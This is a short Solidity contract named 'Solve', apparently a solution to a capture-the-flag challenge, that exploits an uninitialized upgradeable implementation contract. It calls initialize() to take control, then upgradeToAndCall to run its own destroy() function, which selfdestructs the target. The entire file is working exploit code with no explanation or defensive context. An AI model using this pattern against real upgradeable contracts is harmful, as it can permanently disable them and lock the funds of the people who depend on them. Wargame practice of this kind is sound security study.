// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        Engine(target).initialize();
        Engine(target).upgradeToAndCall(address(this), abi.encodeWithSelector(this.destroy.selector));
    }

    function destroy() external {
        selfdestruct(payable(address(0x0)));
    }
}
